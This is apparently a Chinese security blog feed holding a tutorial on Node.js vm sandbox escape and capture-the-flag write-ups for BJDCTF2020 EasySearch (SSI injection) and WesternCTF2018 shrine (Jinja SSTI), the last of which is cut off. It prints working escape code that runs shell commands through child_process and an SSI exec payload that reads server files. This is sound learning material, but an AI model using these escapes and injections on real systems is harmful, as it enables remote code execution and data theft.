id="vm-createContext-sandbox"><a href="#vm-createContext-sandbox" class="headerlink" title="vm.createContext([sandbox])"></a>vm.createContext([sandbox])</h4><blockquote><p> 在使用前需要先创建一个沙箱对象，再将沙箱对象传给该方法（如果没有则会生成一个空的沙箱对象），v8为这个沙箱对象__在当前global外再创建一个作用域__，此时这个沙箱对象就是这个作用域的全局对象，沙箱内部__无法访问global中的属性__。</p></blockquote><h4 id="vm-runInContext-code-contextifiedSandbox-options"><a href="#vm-runInContext-code-contextifiedSandbox-options" class="headerlink" title="vm.runInContext(code, contextifiedSandbox[, options])"></a>vm.runInContext(code, contextifiedSandbox[, options])</h4><blockquote><p>参数为要执行的代码和创建完作用域的沙箱对象，代码会在传入的沙箱对象的上下文中执行，并且参数的值与沙箱内的参数值相同。</p></blockquote><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/20221118183946-521c54fa-672d-1.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> util = <span class="built_in">require</span>(<span class="string">&#x27;util&#x27;</span>)</span><br><span class="line"><span class="variable language_">global</span>.<span class="property">globalVar</span> = <span class="number">3</span></span><br><span class="line"><span class="keyword">const</span> sandbox = &#123;</span><br><span class="line">    <span class="attr">globalVar</span>: <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line">vm.<span class="title function_">createContext</span>(sandbox)</span><br><span class="line">vm.<span class="title function_">runInContext</span>(<span class="string">&#x27;globalVar *= 2;&#x27;</span>, sandbox)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(util.<span class="title function_">inspect</span>(sandbox))</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(util.<span class="title function_">inspect</span>(globalVar))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123; globalVar: 2 &#125;</span><br><span class="line">3</span><br></pre></td></tr></table></figure><blockquote><p>util.inspect(object,[showHidden],[depth],[colors]) 是<strong>一个将任意对象转换为字符串的方法，通常用于调试和错误输出</strong>。 它至少接受一个参数object，即要转换的对象。</p></blockquote><h4 id="vm-runInNewContext-code-sandbox-options"><a href="#vm-runInNewContext-code-sandbox-options" class="headerlink" title="vm.runInNewContext(code[, sandbox][, options])"></a>vm.runInNewContext(code[, sandbox][, options])</h4><blockquote><p>creatContext和runInContext的结合版，传入要执行的代码和沙箱对象。</p></blockquote><h4 id="vm-Script类"><a href="#vm-Script类" class="headerlink" title="vm.Script类"></a>vm.Script类</h4><blockquote><p> vm.Script类型的实例包含若干预编译的脚本，这些脚本能够在特定的沙箱（或者上下文）中被运行。</p></blockquote><h4 id="new-vm-Script-code-options"><a href="#new-vm-Script-code-options" class="headerlink" title="new vm.Script(code, options)"></a>new vm.Script(code, options)</h4><blockquote><p>创建一个新的vm.Script对象只编译代码但不会执行它。编译过的vm.Script此后可以被多次执行。值得注意的是，code是不绑定于任何全局对象的，相反，它仅仅绑定于每次执行它的对象。</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> util = <span class="built_in">require</span>(<span class="string">&#x27;util&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> sandbox = &#123;</span><br><span class="line">    <span class="attr">animal</span>: <span class="string">&#x27;cat&#x27;</span>,</span><br><span class="line">    <span class="attr">count</span>: <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(<span class="string">&#x27;count += 1; name = &quot;kitty&quot;;&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> context = vm.<span class="title function_">createContext</span>(sandbox)</span><br><span class="line">script.<span class="title function_">runInContext</span>(context)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(util.<span class="title function_">inspect</span>(sandbox))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; animal: &#x27;cat&#x27;, count: 3, name: &#x27;kitty&#x27; &#125;</span><br></pre></td></tr></table></figure><h2 id="vm沙箱逃逸的一些情况"><a href="#vm沙箱逃逸的一些情况" class="headerlink" title="vm沙箱逃逸的一些情况"></a>vm沙箱逃逸的一些情况</h2><blockquote><p>我们一般进行沙箱逃逸最后都是进行rce，那么在Node里要进行rce就需要procces了，在获取到process对象后我们就可以用require来导入child_process，再利用child_process执行命令。但process挂载在global上，但是我们上面说了在<code>creatContext</code>后是不能访问到global的，所以我们最终的目标是通过各种办法将global上的process引入到沙箱中。</p></blockquote><h4 id="this"><a href="#this" class="headerlink" title="this"></a>this</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> y1 = vm.<span class="title function_">runInNewContext</span>(<span class="string">`this.constructor.constructor(&#x27;return process.env&#x27;)()`</span>);</span><br><span class="line"><span class="comment">//const y1 = vm.runInNewContext(`this.toString.constructor(&#x27;return process&#x27;)()`);</span></span><br><span class="line">y1.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;whoami&#x27;</span>).<span class="title function_">toString</span>()</span><br></pre></td></tr></table></figure><p>这里面的this指向的是当前传递给<code>runInNewContext</code>的对象，这个对象是不属于沙箱环境的，我们通过这个对象获取到它的构造器，再获得一个构造器对象的构造器（此时为Function的constructor），最后的<code>()</code>是调用这个用Function的constructor生成的函数，最终返回了一个process对象。</p><h4 id="重写toString函数-arguments-callee-caller"><a href="#重写toString函数-arguments-callee-caller" class="headerlink" title="重写toString函数+arguments.callee.caller"></a>重写toString函数+arguments.callee.caller</h4><blockquote><p>函数中的内置对象的属性<code>arguments.callee.caller</code>，它可以返回函数的调用者。</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> script = </span><br><span class="line"><span class="string">`(() =&gt; &#123;</span></span><br><span class="line"><span class="string">    const a = &#123;&#125;</span></span><br><span class="line"><span class="string">    a.toString = function () &#123;</span></span><br><span class="line"><span class="string">      const cc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">      const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span></span><br><span class="line"><span class="string">      return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString()</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    return a</span></span><br><span class="line"><span class="string">  &#125;)()`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">const</span> context = <span class="keyword">new</span> vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line"><span class="keyword">const</span> res = vm.<span class="title function_">runInContext</span>(script, context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hello &#x27;</span> + res)</span><br></pre></td></tr></table></figure><p>这里toString被重写,而console.log时的字符串拼接触发了toString,此时的调用者为global下的console.log,自然就返回了一个外部对象,由此进行rce</p><h4 id="Proxy-get-钩子-arguments-callee-caller"><a href="#Proxy-get-钩子-arguments-callee-caller" class="headerlink" title="Proxy get:钩子 + arguments.callee.caller"></a>Proxy get:钩子 + arguments.callee.caller</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = </span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="string">(() =&gt;&#123;</span></span><br><span class="line"><span class="string">    const a = new Proxy(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="string">        get: function()&#123;</span></span><br><span class="line"><span class="string">            const cc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span></span><br><span class="line"><span class="string">            return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;)</span></span><br><span class="line"><span class="string">    return a</span></span><br><span class="line"><span class="string">&#125;)()</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">const</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">const</span> context = <span class="keyword">new</span> vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line"><span class="keyword">const</span> res = vm.<span class="title function_">runInContext</span>(script, context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="property">abc</span>)</span><br></pre></td></tr></table></figure><p>触发利用链的逻辑就是我们在<code>get:</code>这个钩子里写了一个恶意函数，当我们在沙箱外访问proxy对象的任意属性（不论是否存在）这个钩子就会自动运行，实现了rce。</p><p>此时的调用者依然在沙箱外,即arguments.callee.caller返回的对象是沙箱外的对象</p><p><strong>当沙箱的返回值返回的是我们无法利用的对象或者没有返回值时</strong>,还可以借助异常,将沙箱内的对象抛出去,然后在外部抛出</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = </span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="string">    throw new Proxy(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="string">        get: function()&#123;</span></span><br><span class="line"><span class="string">            const cc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span></span><br><span class="line"><span class="string">            return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;)</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    vm.<span class="title function_">runInContext</span>(script, vm.<span class="title function_">createContext</span>(<span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>)));</span><br><span class="line">&#125;<span class="keyword">catch</span>(e) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;error:&quot;</span> + e) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们用catch捕获到了throw出的proxy对象，在console.log时由于将字符串与对象拼接，将报错信息和rce的回显一起带了出来。</p><h1 id="vm2"><a href="#vm2" class="headerlink" title="vm2"></a>vm2</h1><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://xz.aliyun.com/t/11859">https://xz.aliyun.com/t/11859</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 沙箱逃逸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2020 EasySearch</title>
      <link href="/2024/01/24/BJDCTF2020-EasySearch/"/>
      <url>/2024/01/24/BJDCTF2020-EasySearch/</url>
      
        <content type="html"><![CDATA[<h1 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h1><p>通过扫描发现源码泄露</p><p>index.php.swp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$chars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line"><span class="variable">$random</span> = <span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">uniqid</span>().<span class="variable">$random</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">sha1</span>(<span class="variable">$content</span>); </span><br><span class="line">&#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$admin</span> == <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span>.<span class="title function_ invoke__">get_hash</span>().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            <span class="variable">$shtml</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            <span class="variable">$text</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">***&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$shtml</span>,<span class="variable">$text</span>);</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$shtml</span>);</span><br><span class="line">            ***</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">***</span><br><span class="line">    &#125;</span><br><span class="line">***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先是一个md5截断</p><p>之前的脚本稍微修改一下就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> tp</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">knownMd5 = <span class="string">&#x27;6d0bc1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(<span class="built_in">str</span>(text).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findCode</span>(<span class="params">code</span>):   </span><br><span class="line">    key = code.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    start = <span class="built_in">int</span>(key[<span class="number">0</span>])  </span><br><span class="line">    end = <span class="built_in">int</span>(key[<span class="number">1</span>]) </span><br><span class="line">    <span class="keyword">for</span> code <span class="keyword">in</span> <span class="built_in">range</span>(start, end):</span><br><span class="line">        <span class="keyword">if</span> md5(code)[<span class="number">0</span>:<span class="number">6</span>] == knownMd5:            </span><br><span class="line">            <span class="built_in">print</span> (code)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">list</span>=[] </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):    <span class="comment">#这里的range(number)指爆破出多少结果停止</span></span><br><span class="line">    <span class="built_in">list</span>.append(<span class="built_in">str</span>(<span class="number">10000000</span>*i) + <span class="string">&#x27;:&#x27;</span> + <span class="built_in">str</span>(<span class="number">10000000</span>*(i+<span class="number">1</span>)))</span><br><span class="line">pool = tp()    <span class="comment">#使用多线程加快爆破速度</span></span><br><span class="line">pool.<span class="built_in">map</span>(findCode, <span class="built_in">list</span>) </span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>跑出来是<code>2020666</code></p><p>传入一下</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240124162515513.png" alt="image-20240124162515513"></p><p>响应头中会返回写入的shtml的地址</p><p>访问一下</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240124162701416.png" alt="image-20240124162701416"></p><p>这样的hello xxx最先想到的就是ssti,不过这里似乎不太一样</p><p>先看看什么是shtml</p><h2 id="何为shtml？"><a href="#何为shtml？" class="headerlink" title="何为shtml？"></a>何为shtml？</h2><blockquote><p>SHTML即Server-Parsed HTML。</p><p>shtml文件（还有stm、shtm文件）就是应用了SSI技术的html文件，所以在.shtml页面返回到客户端前，页面中的SSI指令将被服务器解析。可以使用SSI指令将其它文件、图片包含在页面中，也可以将其它的CGI程序包含在页面中，如.aspx文件。在给客户端返回的页面中不会包含SSI指令。如果SSI指令不能被解析，则浏览器会将其做为普通的HTML注释处理</p></blockquote><p>可以看见这个shtml是可以包含SSI命令的,那什么是SSI呢?</p><h2 id="何为SSI"><a href="#何为SSI" class="headerlink" title="何为SSI"></a>何为SSI</h2><blockquote><p>SSI全称是Server Side Includes，即服务器端包含，是一种基于服务器端的网页制作技术。</p><p>SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。</p></blockquote><p>SSI可以直接执行系统命令</p><p>示例:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;ls&quot; --&gt;</span><br></pre></td></tr></table></figure><p>所以我们可以将username改成上面这种ssi命令以达到rce</p><p>最终payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot; --&gt;&amp;password=2020666</span><br></pre></td></tr></table></figure><p>flag就在当前目录的上一级目录中</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">SSI注入漏洞总结</a></p>]]></content>
      
      
      <categories>
          
          <category> buu刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSI注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WesternCTF2018 shrine</title>
      <link href="/2024/01/23/WesternCTF2018-shrine/"/>
      <url>/2024/01/23/WesternCTF2018-shrine/</url>
      
        <content type="html"><![CDATA[<h1 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h1><p>shrine </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import flask import os app = flask.Flask(__name__) app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;) @app.route(&#x27;/&#x27;) def index(): return open(__file__).read() @app.route(&#x27;/shrine/&#x27;) def shrine(shrine): def safe_jinja(s): s = s.replace(&#x27;(&#x27;, &#x27;&#x27;).replace(&#x27;)&#x27;, &#x27;&#x27;) blacklist = [&#x27;config&#x27;, &#x27;self&#x27;] return &#x27;&#x27;.join([&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;.format(c) for c in blacklist]) + s return flask.render_template_string(safe_jinja(shrine)) if __name__ == &#x27;__main__&#x27;: app.run(debug=True) </span><br></pre></td></tr></table></figure><p>很无语这种python放一坨…</p><p>手动format一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line">app = flask.Flask(__name__) </span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>) </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(): </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read() </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shrine</span>(<span class="params">shrine</span>): </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">safe_jinja</span>(<span class="params">s</span>): </span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>) </span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>] </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s </span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine)) </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: </span><br><span class="line">    app.run(debug=<span class="literal">True</span>) </span><br></pre></td></tr></table></figure><p>很明显是ssti,flag被放在了当前app的config里</p><p>在<code>/shrine/</code>这个路由下接收一个参数并使用<code>safe_jinja(s)</code>这个自定义的函数对输入做了一些简单的过滤</p><p>config和self被禁了,是不能直接传入config来查看flag的__(注意,这里并不是正则来禁掉config)__</p><p>看了大佬的文章,总结一下</p><h3 id="在Flask中有4个全局变量"><a href="#在Flask中有4个全局变量" class="headerlink" title="在Flask中有4个全局变量"></a>在Flask中有4个全局变量</h3><h4 id="current-app"><a href="#current-app" class="headerlink" title="current_app"></a>current_app</h4><p>代表当前flask程序实例</p><h4 id="g"><a href="#g" class="headerlink" title="g"></a>g</h4><p>g作为flask程序全局的一个临时变量。充当媒介的功能</p><h4 id="requests对象"><a href="#requests对象" class="headerlink" title="requests对象"></a>requests对象</h4><p>客户端发送的HTTP请求内容</p><h4 id="session"><a href="#session" class="headerlink" title="session"></a>session</h4><h4 id="用户会话"><a href="#用户会话" class="headerlink" title="用户会话"></a>用户会话</h4><p>而current_app又是flask的实例,也就是说。所有和flask有关的。都会放在current_app里面</p><p>既然current_app是一个变量,那就一定存在于__globals__里面,因为globals是python中所有变量的集合</p><p>这里我们只能通过函数去调用__globals__。获得所有全局变量</p><h3 id="flask自带的两个函数"><a href="#flask自带的两个函数" class="headerlink" title="flask自带的两个函数"></a>flask自带的两个函数</h3><h4 id="url-for"><a href="#url-for" class="headerlink" title="url_for()"></a>url_for()</h4><p>url_for会根据传入的路由器函数名,返回该路由对应的URL,在模板中始终使用url_for()就可以安全的修改路由绑定的URL,则不比担心模板中渲染出错的链接:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for(<span class="string">&#x27;home&#x27;</span>)&#125;&#125;</span><br><span class="line">/</span><br></pre></td></tr></table></figure><p>如果我们定义的路由URL是带有参数的,则可以把它们作为关键字参数传入url_for(),Flask会把他们填充进最终生成的URL中:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; url_for(<span class="string">&#x27;post&#x27;</span>, post_id=<span class="number">1</span>)&#125;&#125;</span><br><span class="line">/post/<span 